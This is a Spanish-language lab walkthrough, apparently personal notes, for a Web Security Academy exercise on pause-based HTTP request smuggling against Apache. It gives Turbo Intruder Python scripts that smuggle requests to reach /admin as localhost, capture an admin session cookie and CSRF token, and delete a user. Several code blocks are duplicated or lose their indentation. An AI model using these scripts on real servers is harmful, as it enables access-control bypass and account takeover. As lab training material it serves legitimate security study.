
La desincronización basada en pausa es un tipo de ataque que se aprovecha del comportamiento de ciertos servidores cuando reciben solicitudes HTTP incompletas. Este ataque se realiza enviando los encabezados de una solicitud, prometiendo un cuerpo que nunca se envía, y luego esperando un tiempo determinado antes de enviar el resto de la solicitud.
Com esta tarea puede resultar incómoda usaremos un script en python en turbo intruder que automatice ese proceso. 
Primero interceptamos, podemos ver que tiene Apache/2.4.52 que es vulnerable a esto. click derecho > sent to turbo intruder
![[Pasted image 20240819142400.png]]
```
 When you paste the code it will have an extra odds spaces which cause error
```

Si esta es la primera vez que usas Turbo Intruder, es una extensión que podes conseguir en la pestaña Extensions > BApp de Burpquiste. El "s%" representa la variable que el turbo intruder va a ir cambiando
Hay una variable "smuggled_request" en donde está el host de la página propia, como el host iría el ID de nuestro laboratorio propio.
Tenemos un attack requets que es una petición post a una ruta.
El pauseMarker tiene definido también una solicitud GET con dos CRLF.
Cuando ejecutemos esto, obtendremos un 404 que confirma la race condition
```py
 def queueRequests(target, _):
    engine = RequestEngine(
        endpoint="https://LAB_ID.web-security-academy.net:443",
        concurrentConnections=1,
        requestsPerConnection=100,
        pipeline=False
    )

    # attack request
    attack_request = """POST /resources HTTP/1.1
Host: LAB_ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: %s

%s"""

    # smuggled request GET
    smuggled_request = """GET /uripathdoesnotexist/ HTTP/1.1
Host: LAB_ID.web-security-academy.net

"""


    # normal request
    normal_request = """GET / HTTP/1.1
Host: LAB_ID.web-security-academy.net

"""

    engine.queue(attack_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nGET'], pauseTime=61000)
    engine.queue(normal_request)

def handleResponse(req, _):
    table.add(req)


 """
    
     engine.queue(attack_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nGET'], pauseTime=61000)
    
     engine.queue(normal_request)
    

 def handleResponse(req, _):
    
     table.add(req)
```

Si ves un eror como:
User ýthon error, check extender for full detais: SyntaxErrpr:("no viable alternative character '\xa0'",)
Entonces la identación esta causando error
Ahora hacemo lo mismo para la ruta de admin
```
 def queueRequests(target, _):

engine = RequestEngine(

endpoint="https://LAB-ID.web-security-academy.net:443",

concurrentConnections=1,

requestsPerConnection=100,

pipeline=False

)

  

# attack request

attack_request = """POST /resources HTTP/1.1

Host: LAB-ID.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

Connection: keep-alive

Content-Length: %s

  

%s"""

  

# smuggled request GET

smuggled_request = """GET /admin/ HTTP/1.1

Host: localhost

  

"""

  

normal_request = """GET / HTTP/1.1

Host: LAB-ID.web-security-academy.net

  

"""

  

engine.queue(attack_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nGET'], pauseTime=61000)

engine.queue(normal_request)

  

def handleResponse(req, _):

table.add(req)
```
Es importante el slash al final porque el servidor sino te redirije automáticamente. Esto nos debería dar un 200 OK donde está la cookie sesion que copiaríamos. Y también el input que tiene un value con el csrf token

![[Pasted image 20240819154910.png]]

Utilizan el session ID y las cookies podemos realizar las acciones del admin
```
def queueRequests(target, _):

engine = RequestEngine(

endpoint="https://0a0d00f704ff88b880f6e4b1000d0045.web-security-academy.net:443",

concurrentConnections=1,

requestsPerConnection=100,

pipeline=False

)

  

# attack request

attack_request = """POST /resources HTTP/1.1

Host: 0a0d00f704ff88b880f6e4b1000d0045.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

Connection: keep-alive

Content-Length: %s

  

%s"""

  

# smuggled request POST

smuggled_request = """POST /admin/delete/ HTTP/1.1

Content-Length: 55

Cookie: session=dZIrxoctZoO77up1lOYtJGvvFF6oCHKY

Host: localhost

csrf=89hYeJ9bhHQyT4mNmGYL65HRkxKNLwGs&username=carlos

"""

  

# normal request

normal_request = """GET / HTTP/1.1

Host: 0a0d00f704ff88b880f6e4b1000d0045.web-security-academy.net

  

"""

  

engine.queue(attack_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nPOST'], pauseTime=61000)

engine.queue(normal_request)

  

def handleResponse(req, _):

table.add(req)
```
]]